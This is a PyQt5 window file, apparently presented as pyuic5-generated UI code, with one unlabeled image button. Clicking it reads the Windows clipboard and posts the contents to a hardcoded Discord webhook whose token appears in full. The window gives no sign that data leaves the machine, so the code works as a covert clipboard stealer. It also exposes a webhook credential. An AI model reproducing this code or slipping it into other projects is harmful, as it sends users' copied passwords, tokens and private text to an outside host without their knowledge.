# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'C:\Users\luis-\Desktop\Xd\Programa\PYQT5\Principal.ui'
#
# Created by: PyQt5 UI code generator 5.15.2
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


import Fondo
import Boton
from PyQt5 import QtCore, QtGui, QtWidgets
import win32clipboard


class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(302, 302)
        MainWindow.setStyleSheet("background-image: url(:/01/Cavern_wide.jpg);\n"
                                 "background-repeat: no-repeat;\n"
                                 "background-attachment: fixed;\n"
                                 "background-position: bottom right;\n"
                                 "")
        MainWindow.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(80, 110, 121, 41))
        self.pushButton.setStyleSheet("border-image: url(:/02/bruh.png);")
        self.pushButton.setText("")
        self.pushButton.setObjectName("pushButton")
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))

        ###Botones aqui###
        self.pushButton.clicked.connect(self.enviar)

    def enviar(hook,x):
        from dhooks import Webhook
        hook = Webhook(
            'https://discord.com/api/webhooks/757246852956684309/3hWkPKQbb7F1dLNh5bibYm4RM7EgcuA-f-pAFKk8RMe8p1nGUh8HssgbAJczu9bgr6oo')
        win32clipboard.OpenClipboard()
        x = win32clipboard.GetClipboardData()
        hook.send(x)
        win32clipboard.CloseClipboard()

        print("Terminado!")


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())